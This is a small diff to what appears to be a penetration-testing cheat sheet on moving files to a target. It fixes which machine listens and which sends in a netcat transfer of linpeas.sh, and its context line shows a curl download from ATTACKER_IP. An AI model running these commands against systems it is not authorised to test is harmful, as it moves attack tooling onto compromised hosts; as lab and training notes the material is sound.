@@ -73,11 +73,11 @@ curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh
 3. Netcat (nc) File Transfer 
 If nc is available on the target, it can be used to send binary files directly. 
 
-Attacker Machine (Listener / Sender):
+Target Machine (Receiver):
 ```bash
 nc -lvp 4444 > linpeas.sh
 ```
-Target Machine (Receiver):
+Attacker Machine (Sender):
 ```bash
 nc ATTACKER_IP 4444 < linpeas.sh
 ```
